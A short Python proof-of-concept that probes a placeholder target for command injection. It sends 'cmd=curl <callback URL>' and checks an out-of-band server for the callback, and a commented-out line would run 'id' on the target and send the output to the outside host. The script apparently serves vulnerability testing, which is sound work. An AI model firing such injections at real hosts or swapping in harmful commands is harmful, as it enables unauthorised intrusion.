import requests
import time
import re

oob_server = 'http://104.225.xxx.xx:8888'       # OOB Server
get_url = oob_server + '/geturl'
target_url = "http://victim.com:8443/vuln"      # vulnerable host


def fetch_randomURL(url):
    """ Fetching random URL from OOB server. """
    try:
        print(f"[+] Fetching random URL from {url}")
        response = requests.get(url)
        response.raise_for_status() 
        match = re.search(r'(http(s)?:\/\/[^\/]+\/[a-zA-Z0-9]{6})', response.text)
        return match.group(1) if match else None
    except Exception as e:
        print(f"[!] Error fetching URL: {e}")
        return None


def send_poc(randomURL):
    # Sending request with POC to vulnerable host
    #param = f"cmd=curl {oob_server}`id`"
    param = f"cmd=curl {randomURL}"     # POC HERE!

    try:
        print("-"*80)
        print(f"Target: {target_url}\nMethod: POST\nRequest Body:")
        print("-"*80)
        print(f"{param}")
        print("-"*80)
        for i in range(2):
            print("[+] Sending request with POC ..")
            response = requests.post(target_url, data=param, timeout=5)
            response.raise_for_status()
            print(f"[+] Got response from {target_url} \nStatus Code: {response.status_code}\nResponse Body:")
            print("="*80)
            print(response.content.decode())
            print("="*80)
            time.sleep(2)
    except Exception as e:
        #print(f"Error in sending POC to {url}: {e}\n")
        print(f"[!] Error in sending POC to {target_url}\n")


def is_vulnerable(randomURL):

    if randomURL:
        monitorURL = f"{randomURL}?m=1"
        print(f"[+] Monitor URL will be: {monitorURL}")
        last_content = ''
        send_poc(randomURL)


        try:
            response = requests.get(monitorURL, timeout=5)
            response.raise_for_status()
            if response.text != last_content:
                print(f"[+] {randomURL} received access record: {response.text}")
                print(f"[+] Looks {target_url} is vulnerable!")
                last_content = response.text

        except Exception as e:
            #print(f"{monitorURL}: {e}")
            print(f"[!] No response from {monitorURL}")



if __name__ == "__main__":

    randomURL = fetch_randomURL(get_url)
    if randomURL:
        print(f"[+] Got random URL {randomURL}")
    else:
        print(f"[!] Get random URL failed.")

    is_vulnerable(randomURL)
